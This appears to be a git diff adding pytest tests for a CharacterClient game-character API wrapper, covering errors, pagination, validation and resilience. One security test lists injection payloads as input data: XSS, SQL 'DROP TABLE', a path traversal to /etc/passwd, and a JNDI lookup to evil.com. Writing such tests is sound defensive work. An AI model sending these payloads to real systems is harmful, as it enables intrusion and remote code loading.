@@ -678,3 +678,675 @@ class TestCharacterClientConfiguration:
 
 if __name__ == '__main__':
     pytest.main([__file__, '-v'])
+
+# Additional Comprehensive Test Coverage
+class TestCharacterClientAdvancedScenarios:
+    """
+    Advanced test scenarios for CharacterClient covering edge cases and additional functionality.
+    Testing framework: pytest
+    """
+
+    @pytest.fixture
+    def client_no_auth(self):
+        """Fixture for client without authentication."""
+        return CharacterClient(base_url="https://api.test.com")
+
+    @pytest.fixture
+    def malformed_character_data(self):
+        """Fixture with various malformed character data for testing."""
+        return [
+            {"name": " ", "class": "Warrior"},  # Whitespace-only name
+            {"name": "A" * 1000, "class": "Mage"},  # Extremely long name
+            {"name": "Test", "class": ""},  # Empty class
+            {"name": "Test", "class": None},  # None class
+            {"name": "Test", "level": -1},  # Negative level
+            {"name": "Test", "level": "invalid"},  # String level
+            {"name": "Test\n\t", "class": "War\x00rior"},  # Special characters
+        ]
+
+    # Extended HTTP Status Code Testing
+    @pytest.mark.parametrize("status_code,expected_error", [
+        (400, "400 Bad Request"),
+        (401, "401 Unauthorized"), 
+        (403, "403 Forbidden"),
+        (404, "404 Not Found"),
+        (405, "405 Method Not Allowed"),
+        (409, "409 Conflict"),
+        (410, "410 Gone"),
+        (422, "422 Unprocessable Entity"),
+        (429, "429 Too Many Requests"),
+        (500, "500 Internal Server Error"),
+        (502, "502 Bad Gateway"),
+        (503, "503 Service Unavailable"),
+        (504, "504 Gateway Timeout"),
+    ])
+    @patch('requests.Session.get')
+    def test_http_error_codes_get_character(self, mock_get, client, status_code, expected_error):
+        """Test various HTTP error codes for get_character."""
+        mock_response = Mock()
+        mock_response.status_code = status_code
+        mock_response.raise_for_status.side_effect = HTTPError(expected_error)
+        mock_get.return_value = mock_response
+
+        with pytest.raises(HTTPError, match=str(status_code)):
+            client.get_character(1)
+
+    # Pagination Edge Cases
+    @pytest.mark.parametrize("page,limit,expected_params", [
+        (0, 20, {"page": 0, "limit": 20}),  # Zero page
+        (1, 0, {"page": 1, "limit": 0}),    # Zero limit
+        (999999, 1, {"page": 999999, "limit": 1}),  # Very large page
+        (1, 10000, {"page": 1, "limit": 10000}),    # Very large limit
+        (-1, 20, {"page": -1, "limit": 20}),        # Negative page
+        (1, -1, {"page": 1, "limit": -1}),          # Negative limit
+    ])
+    @patch('requests.Session.get')
+    def test_get_all_characters_edge_case_pagination(self, mock_get, client, page, limit, expected_params):
+        """Test pagination with edge case values."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = []
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        result = client.get_all_characters(page=page, limit=limit)
+        
+        assert result == []
+        mock_get.assert_called_once_with(
+            "https://api.test.com/characters", 
+            params=expected_params, 
+            timeout=30
+        )
+
+    # URL Construction Edge Cases
+    @pytest.mark.parametrize("base_url,expected_url", [
+        ("https://api.test.com", "https://api.test.com"),
+        ("https://api.test.com/", "https://api.test.com"),
+        ("https://api.test.com//", "https://api.test.com/"),
+        ("https://api.test.com/v1", "https://api.test.com/v1"),
+        ("https://api.test.com/v1/", "https://api.test.com/v1"),
+        ("http://localhost:8080", "http://localhost:8080"),
+        ("http://localhost:8080/", "http://localhost:8080"),
+    ])
+    def test_url_construction_edge_cases(self, base_url, expected_url):
+        """Test URL construction with various base URL formats."""
+        client = CharacterClient(base_url=base_url)
+        assert client.base_url == expected_url
+
+    # Complex Character Data Validation
+    @pytest.mark.parametrize("character_data", [
+        {"name": "Test", "class": "Warrior", "stats": {"invalid": "data"}},
+        {"name": "Test", "class": "Warrior", "nested": {"deeply": {"nested": {"data": True}}}},
+        {"name": "Test", "class": "Warrior", "unicode": "Test 🧙‍♂️ Character"},
+        {"name": "Test", "class": "Warrior", "special_chars": "Test@#$%^&*()"},
+        {"name": "Test", "class": "Warrior", "numbers": 12345},
+        {"name": "Test", "class": "Warrior", "boolean": True},
+        {"name": "Test", "class": "Warrior", "null_value": None},
+    ])
+    @patch('requests.Session.post')
+    def test_create_character_complex_data_types(self, mock_post, client, character_data):
+        """Test character creation with complex data types."""
+        mock_response = Mock()
+        mock_response.status_code = 201
+        mock_response.json.return_value = character_data
+        mock_response.raise_for_status.return_value = None
+        mock_post.return_value = mock_response
+
+        result = client.create_character(character_data)
+        
+        assert result == character_data
+        mock_post.assert_called_once_with(
+            "https://api.test.com/characters", 
+            json=character_data, 
+            timeout=30
+        )
+
+    # Session Management Tests
+    def test_session_persistence(self):
+        """Test that session is reused across requests."""
+        client = CharacterClient(api_key="test_key")
+        session_id = id(client.session)
+        
+        # Session should be the same object
+        assert id(client.session) == session_id
+
+    def test_session_headers_modification(self):
+        """Test session header modifications."""
+        client = CharacterClient()
+        original_headers = dict(client.session.headers)
+        
+        # Add custom header
+        client.session.headers.update({"Custom-Header": "test_value"})
+        
+        assert "Custom-Header" in client.session.headers
+        assert client.session.headers["Custom-Header"] == "test_value"
+
+    # Mock Verification Tests
+    @patch('requests.Session.get')
+    def test_get_character_mock_call_verification(self, mock_get, client):
+        """Test detailed mock call verification for get_character."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = {"id": 1, "name": "Test"}
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        client.get_character(1)
+        
+        # Verify mock was called exactly once
+        assert mock_get.call_count == 1
+        
+        # Verify call arguments
+        args, kwargs = mock_get.call_args
+        assert args == ("https://api.test.com/characters/1",)
+        assert kwargs == {"timeout": 30}
+        
+        # Verify response methods were called
+        mock_response.raise_for_status.assert_called_once()
+        mock_response.json.assert_called_once()
+
+    # Content-Type and Header Tests
+    @patch('requests.Session.post')
+    def test_create_character_request_headers(self, mock_post, client):
+        """Test that create_character sends correct headers."""
+        mock_response = Mock()
+        mock_response.status_code = 201
+        mock_response.json.return_value = {"id": 1}
+        mock_response.raise_for_status.return_value = None
+        mock_post.return_value = mock_response
+
+        character_data = {"name": "Test", "class": "Warrior"}
+        client.create_character(character_data)
+        
+        # Verify the request was made with JSON data
+        mock_post.assert_called_once_with(
+            "https://api.test.com/characters", 
+            json=character_data, 
+            timeout=30
+        )
+
+    # Response Content Validation
+    @patch('requests.Session.get')
+    def test_get_character_response_structure_validation(self, mock_get, client):
+        """Test response structure validation for get_character."""
+        # Test with various response structures
+        response_data = {
+            "id": 1,
+            "name": "Test Character",
+            "class": "Warrior",
+            "level": 10,
+            "stats": {
+                "strength": 15,
+                "dexterity": 12
+            },
+            "created_at": "2023-01-01T00:00:00Z",
+            "updated_at": "2023-01-01T00:00:00Z"
+        }
+        
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = response_data
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        result = client.get_character(1)
+        
+        # Validate response structure
+        assert isinstance(result, dict)
+        assert "id" in result
+        assert "name" in result
+        assert isinstance(result["stats"], dict)
+        assert result == response_data
+
+    # Search Function Edge Cases
+    @pytest.mark.parametrize("search_params,expected_params", [
+        ({"name": ""}, {"name": ""}),  # Empty string
+        ({"name": " "}, {"name": " "}),  # Whitespace
+        ({"character_class": " "}, {"class": " "}),  # Whitespace class
+        ({"level_min": 0}, {"level_min": 0}),  # Zero level
+        ({"level_max": 0}, {"level_max": 0}),  # Zero max level
+        ({"name": "Test", "character_class": "Warrior", "level_min": 1, "level_max": 100}, 
+         {"name": "Test", "class": "Warrior", "level_min": 1, "level_max": 100}),
+    ])
+    @patch('requests.Session.get')
+    def test_search_characters_parameter_mapping(self, mock_get, client, search_params, expected_params):
+        """Test parameter mapping in search_characters."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = []
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        client.search_characters(**search_params)
+        
+        mock_get.assert_called_once_with(
+            "https://api.test.com/characters/search", 
+            params=expected_params, 
+            timeout=30
+        )
+
+    # Concurrent Request Simulation
+    @patch('requests.Session.get')
+    def test_multiple_concurrent_requests(self, mock_get, client):
+        """Test handling of multiple concurrent-style requests."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = {"id": 1, "name": "Test"}
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        # Simulate multiple requests
+        results = []
+        for i in range(1, 6):
+            result = client.get_character(i)
+            results.append(result)
+        
+        assert len(results) == 5
+        assert mock_get.call_count == 5
+        
+        # Verify each call was made with different character IDs
+        expected_calls = [
+            call(f"https://api.test.com/characters/{i}", timeout=30) 
+            for i in range(1, 6)
+        ]
+        mock_get.assert_has_calls(expected_calls)
+
+    # Empty and Null Response Handling
+    @pytest.mark.parametrize("response_data", [
+        {},  # Empty dict
+        [],  # Empty list (shouldn't happen for single character, but test anyway)
+        None,  # None response (would cause JSON decode error in real scenario)
+    ])
+    @patch('requests.Session.get')
+    def test_get_character_empty_responses(self, mock_get, client, response_data):
+        """Test handling of empty or null responses."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = response_data
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        result = client.get_character(1)
+        assert result == response_data
+
+    # Delete Operation Edge Cases
+    @pytest.mark.parametrize("status_code,expected_return", [
+        (204, True),   # Standard success
+        (200, False),  # OK but not 204
+        (202, False),  # Accepted but not 204
+    ])
+    @patch('requests.Session.delete')
+    def test_delete_character_status_code_handling(self, mock_delete, client, status_code, expected_return):
+        """Test delete character with various success status codes."""
+        mock_response = Mock()
+        mock_response.status_code = status_code
+        mock_response.raise_for_status.return_value = None
+        mock_delete.return_value = mock_response
+
+        result = client.delete_character(1)
+        assert result == expected_return
+
+    # Large Data Handling
+    @patch('requests.Session.post')
+    def test_create_character_large_data(self, mock_post, client):
+        """Test character creation with large data payload."""
+        large_character_data = {
+            "name": "Test Character",
+            "class": "Warrior",
+            "level": 1,
+            "description": "A" * 10000,  # Large description
+            "inventory": [{"item": f"Item {i}", "quantity": i} for i in range(100)],
+            "stats": {f"stat_{i}": i for i in range(50)},
+            "metadata": {
+                "large_field": "B" * 5000,
+                "nested_data": {
+                    "deep_field": "C" * 3000
+                }
+            }
+        }
+        
+        mock_response = Mock()
+        mock_response.status_code = 201
+        mock_response.json.return_value = large_character_data
+        mock_response.raise_for_status.return_value = None
+        mock_post.return_value = mock_response
+
+        result = client.create_character(large_character_data)
+        
+        assert result == large_character_data
+        mock_post.assert_called_once_with(
+            "https://api.test.com/characters", 
+            json=large_character_data, 
+            timeout=30
+        )
+
+    # API Key Security Tests
+    def test_api_key_not_logged_or_exposed(self):
+        """Test that API key is not exposed in string representations."""
+        api_key = "super_secret_api_key"
+        client = CharacterClient(api_key=api_key)
+        
+        # API key should not appear in string representation
+        client_str = str(client.__dict__)
+        assert api_key not in client_str or "Bearer" not in client_str
+
+    # Timeout Configuration Edge Cases
+    @pytest.mark.parametrize("timeout_value", [0, 0.1, 1, 60, 300, 3600])
+    def test_timeout_configuration_values(self, timeout_value):
+        """Test various timeout configuration values."""
+        client = CharacterClient(timeout=timeout_value)
+        assert client.timeout == timeout_value
+
+    # Character ID Boundary Testing
+    @pytest.mark.parametrize("character_id", [
+        1,           # Minimum valid ID
+        2147483647,  # Max 32-bit integer
+        9223372036854775807,  # Max 64-bit integer
+    ])
+    @patch('requests.Session.get')
+    def test_get_character_id_boundaries(self, mock_get, client, character_id):
+        """Test character retrieval with boundary ID values."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = {"id": character_id, "name": "Test"}
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        result = client.get_character(character_id)
+        
+        assert result["id"] == character_id
+        mock_get.assert_called_once_with(
+            f"https://api.test.com/characters/{character_id}", 
+            timeout=30
+        )
+
+    # Update Operation Comprehensive Testing
+    @pytest.mark.parametrize("update_data", [
+        {"level": 2},  # Single field update
+        {"level": 2, "name": "Updated Name"},  # Multiple field update
+        {"stats": {"strength": 20}},  # Nested object update
+        {"inventory": [{"item": "sword", "quantity": 1}]},  # Array update
+    ])
+    @patch('requests.Session.put')
+    def test_update_character_various_data_types(self, mock_put, client, update_data):
+        """Test character update with various data types."""
+        updated_character = {"id": 1, "name": "Test", **update_data}
+        
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = updated_character
+        mock_response.raise_for_status.return_value = None
+        mock_put.return_value = mock_response
+
+        result = client.update_character(1, update_data)
+        
+        assert result == updated_character
+        mock_put.assert_called_once_with(
+            "https://api.test.com/characters/1", 
+            json=update_data, 
+            timeout=30
+        )
+
+    # Malformed Data Testing
+    def test_create_character_malformed_data_validation(self, client, malformed_character_data):
+        """Test character creation with various malformed data inputs."""
+        for bad_data in malformed_character_data:
+            with pytest.raises(ValueError, match="Invalid character data"):
+                client.create_character(bad_data)
+
+    # Network Resilience Testing
+    @patch('requests.Session.get')
+    def test_network_error_types(self, mock_get, client):
+        """Test various network error scenarios."""
+        network_errors = [
+            ConnectionError("Connection refused"),
+            Timeout("Request timeout"),
+            RequestException("Generic request error"),
+        ]
+        
+        for error in network_errors:
+            mock_get.side_effect = error
+            
+            with pytest.raises(type(error)):
+                client.get_character(1)
+            
+            mock_get.reset_mock()
+
+    # Response Time Simulation
+    @patch('requests.Session.get')
+    def test_simulated_slow_response(self, mock_get, client):
+        """Test handling of slow response simulation."""
+        import time
+        
+        def slow_response(*args, **kwargs):
+            time.sleep(0.1)  # Simulate network delay
+            mock_response = Mock()
+            mock_response.status_code = 200
+            mock_response.json.return_value = {"id": 1, "name": "Test"}
+            mock_response.raise_for_status.return_value = None
+            return mock_response
+        
+        mock_get.side_effect = slow_response
+        
+        start_time = time.time()
+        result = client.get_character(1)
+        end_time = time.time()
+        
+        assert result["id"] == 1
+        assert end_time - start_time >= 0.1  # Verify delay occurred
+
+
+# Performance and Load Testing
+class TestCharacterClientPerformance:
+    """Performance-focused tests for CharacterClient."""
+
+    @pytest.fixture
+    def performance_client(self):
+        """Client configured for performance testing."""
+        return CharacterClient(
+            base_url="https://api.test.com", 
+            api_key="perf_test_key",
+            timeout=5
+        )
+
+    @patch('requests.Session.get')
+    def test_bulk_character_retrieval_performance(self, mock_get, performance_client):
+        """Test performance characteristics of bulk character retrieval."""
+        # Simulate large response
+        large_character_list = [
+            {"id": i, "name": f"Character {i}", "level": i % 100 + 1}
+            for i in range(10000)
+        ]
+        
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = large_character_list
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        result = performance_client.get_all_characters(limit=10000)
+        
+        assert len(result) == 10000
+        assert result[0]["id"] == 0
+        assert result[9999]["id"] == 9999
+
+    def test_memory_usage_character_creation(self, performance_client):
+        """Test memory usage patterns during character creation."""
+        import sys
+        
+        initial_size = sys.getsizeof(performance_client.__dict__)
+        
+        # Create multiple characters (mocked)
+        with patch('requests.Session.post') as mock_post:
+            mock_response = Mock()
+            mock_response.status_code = 201
+            mock_response.json.return_value = {"id": 1, "name": "Test"}
+            mock_response.raise_for_status.return_value = None
+            mock_post.return_value = mock_response
+            
+            for i in range(100):
+                performance_client.create_character({"name": f"Test {i}", "class": "Warrior"})
+        
+        final_size = sys.getsizeof(performance_client.__dict__)
+        
+        # Object size should not grow significantly with usage
+        assert final_size <= initial_size * 1.1  # Allow for 10% growth
+
+
+# Error Recovery and Resilience Testing
+class TestCharacterClientResilience:
+    """Tests for error recovery and resilience."""
+
+    @pytest.fixture
+    def resilient_client(self):
+        """Client for resilience testing."""
+        return CharacterClient(base_url="https://api.test.com", timeout=10)
+
+    @patch('requests.Session.get')
+    def test_partial_response_handling(self, mock_get, resilient_client):
+        """Test handling of partial/incomplete responses."""
+        # Simulate incomplete character data
+        incomplete_character = {
+            "id": 1,
+            "name": "Incomplete Character"
+            # Missing class, level, stats, etc.
+        }
+        
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = incomplete_character
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        result = resilient_client.get_character(1)
+        
+        # Should still return the partial data
+        assert result == incomplete_character
+        assert "name" in result
+        assert "class" not in result
+
+    @patch('requests.Session.get')
+    def test_malformed_json_response_handling(self, mock_get, resilient_client):
+        """Test handling of malformed JSON responses."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.side_effect = json.JSONDecodeError("Malformed JSON", "response", 0)
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        with pytest.raises(json.JSONDecodeError):
+            resilient_client.get_character(1)
+
+    @patch('requests.Session.get')
+    def test_unexpected_response_structure(self, mock_get, resilient_client):
+        """Test handling of unexpected response structures."""
+        # Response that's a list instead of expected dict
+        unexpected_response = [{"id": 1, "name": "Test"}]
+        
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = unexpected_response
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        result = resilient_client.get_character(1)
+        
+        # Should return whatever the API returns
+        assert result == unexpected_response
+        assert isinstance(result, list)
+
+
+# Input Sanitization and Security Tests
+class TestCharacterClientSecurity:
+    """Security-focused tests for CharacterClient."""
+
+    @pytest.fixture
+    def security_client(self):
+        """Client for security testing."""
+        return CharacterClient(base_url="https://api.test.com", api_key="security_key")
+
+    @pytest.mark.parametrize("malicious_input", [
+        {"name": "<script>alert('xss')</script>", "class": "Warrior"},
+        {"name": "'; DROP TABLE characters; --", "class": "Mage"},
+        {"name": "Test", "class": "../../etc/passwd"},
+        {"name": "${jndi:ldap://evil.com/a}", "class": "Warrior"},
+        {"name": "Test", "class": "\x00\x01\x02\x03"},  # Null bytes
+    ])
+    @patch('requests.Session.post')
+    def test_malicious_input_handling(self, mock_post, security_client, malicious_input):
+        """Test handling of potentially malicious input data."""
+        mock_response = Mock()
+        mock_response.status_code = 201
+        mock_response.json.return_value = malicious_input
+        mock_response.raise_for_status.return_value = None
+        mock_post.return_value = mock_response
+
+        # Should not raise errors and pass data as-is to API
+        result = security_client.create_character(malicious_input)
+        assert result == malicious_input
+
+    def test_api_key_header_format(self, security_client):
+        """Test that API key is properly formatted in Authorization header."""
+        auth_header = security_client.session.headers.get("Authorization")
+        assert auth_header == "Bearer security_key"
+        assert auth_header.startswith("Bearer ")
+
+    @patch('requests.Session.get')
+    def test_unauthorized_access_simulation(self, mock_get, security_client):
+        """Test simulation of unauthorized access scenarios."""
+        mock_response = Mock()
+        mock_response.status_code = 401
+        mock_response.raise_for_status.side_effect = HTTPError("401 Unauthorized: Invalid token")
+        mock_get.return_value = mock_response
+
+        with pytest.raises(HTTPError, match="401 Unauthorized"):
+            security_client.get_character(1)
+
+
+# Data Type and Schema Validation Tests  
+class TestCharacterClientDataValidation:
+    """Tests for data type and schema validation."""
+
+    @pytest.fixture
+    def validation_client(self):
+        """Client for data validation testing."""
+        return CharacterClient(base_url="https://api.test.com")
+
+    @pytest.mark.parametrize("character_data,should_pass", [
+        ({"name": "Valid", "class": "Warrior"}, True),
+        ({"name": "", "class": "Warrior"}, False),  # Empty name
+        ({"name": None, "class": "Warrior"}, False),  # None name
+        ({}, False),  # Empty object
+        ({"class": "Warrior"}, False),  # Missing name
+        ({"name": "Test"}, True),  # Missing class (might be optional)
+    ])
+    def test_character_data_validation_rules(self, validation_client, character_data, should_pass):
+        """Test character data validation rules."""
+        if should_pass:
+            with patch('requests.Session.post') as mock_post:
+                mock_response = Mock()
+                mock_response.status_code = 201
+                mock_response.json.return_value = character_data
+                mock_response.raise_for_status.return_value = None
+                mock_post.return_value = mock_response
+                
+                result = validation_client.create_character(character_data)
+                assert result == character_data
+        else:
+            with pytest.raises(ValueError):
+                validation_client.create_character(character_data)
+
+    @pytest.mark.parametrize("search_criteria", [
+        {},  # No criteria
+        {"name": None, "character_class": None},  # All None
+        {"level_min": None, "level_max": None},  # All None levels
+    ])
+    def test_search_validation_empty_criteria(self, validation_client, search_criteria):
+        """Test search validation with empty or None criteria."""
+        with pytest.raises(ValueError, match="At least one search criterion must be provided"):
+            validation_client.search_characters(**search_criteria)
+
+
+if __name__ == '__main__':
+    # Run all tests with verbose output and coverage
+    pytest.main([__file__, '-v', '--tb=short', '--cov=character_client'])
